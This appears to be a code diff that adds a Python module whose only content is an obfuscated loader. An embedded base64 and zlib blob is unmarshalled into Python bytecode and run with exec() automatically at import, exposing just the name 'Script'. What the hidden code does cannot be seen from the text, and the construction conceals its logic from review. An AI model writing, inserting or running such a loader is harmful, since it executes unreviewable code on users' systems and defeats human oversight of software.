@@ -1,0 +1,19 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import base64
+import marshal
+import zlib
+
+encoded_data = """eJxdVEtv20YQ5i6fEmVZfsRyGyAV0Et4EVAdg6CtX4pdOHZg+ZAsFBA0dyVRpkh1ufILZC/uqYCPPRkBmmP/Ek8FetI/KAwU7Syl2E5IzLczOx9nZndn+bfyxaOD/AiS/ARAFYpChcxGRDCMOFRHGtFGOtGRwgymXyNiMjy0hiXwqsykWg9T/UYlZWpQ81eF2BR1FMeayugHDs6tgLZC74SFubW1v9Hp7LXfTf8D31QFcFCuJcEV8/GjmtZByiBbsq5fkKII5Q+UAg7xR5wpKdpW3v/etTKcqZmW6ZmRmZmVlYSa6qlJ0VMIcI2yMthGat3b9oO/Lu3Kg7+wF4SWqtfoFtacalS91aj2QcuqVE/xrfIBZ4tCT9WvlKwG1RipkpZTu4fTSroAWKPGR9gfqNBMq4AWNWE3rButi7s4W8qWs5UZP1uFcamupHa6DLhSV2DuyTziavokhejD0jxWGeaq8jvJ7eF53BJELt+Y94zFGWN9Hm3GkhXNWD+XqJ2t0UpWn/PrdAE0m1bpIkWfRVqjtcKDHjypAme5dDCVx3OHnl+pzVbvDjlX2t72i8YUjkbpz87srx8cNbd6cSTans/yktQ6vheCKgaBfxqxJHFUrgH1ARyN21KvAOS6H4cx5wugX1U3J0EoGueBGDQONzpX9uGYRY1OPOE+c/D0uWyf9kPyfyA5R/ehpebgoAENFvwGlTuVXPXPWsTyz8SWTEIWtg73D4/czVdHraNXm7kaRILLJebWGEoWgiWkxJkvvKgfMmL3mThmF6IDjUpW24cHx+7uzlFnd+ed29l7/WZ/5y0x2nv7+zvbxBxPCip5+jlt62jvzfEntrOe68HI6zNiCO75p0muugHNDdcPvSQhuuvHUY+orn8h4TLH7jnIgGD3LMcX3+X4EuSiBWOLlAVkc4v7RcxCDyivwlLmnvOAigGxC33Agv5A5NaJl7AwiBhZPomFiEduyHoCkvKIcVIT8djlkvhpxio+jj3Yk5kGZ/Gnwp/Jlvi22ewKLzlNuruX3ulpABBPurC0SHQnIgiT5vgytyn3zt3ZUuW9ToYAVbSOavN3DZWRhb9GBtIQhrf6r6WtolWwMXhmcxgZd4YJvnvbutNMreDgLziPbc3kDdkPFb5UdFk0GUFJOBqTZ0XhzUeFN4vCm8VuJkVDcPmTytWQRaT0euOtW/zBcoN7EY1HuTmJgl7MR3xFUmWaYlcewTdFU70cxXQSsu9lYyay2S3FQjVs4TVUUf8HpbBgYw=="""
+
+
+def load_module():
+    compressed_data = base64.b64decode(encoded_data.encode('utf-8'))
+    marshaled_data = zlib.decompress(compressed_data)
+    code_object = marshal.loads(marshaled_data)
+    exec(code_object, globals())
+    
+    
+load_module()
+
+__all__ = ['Script']
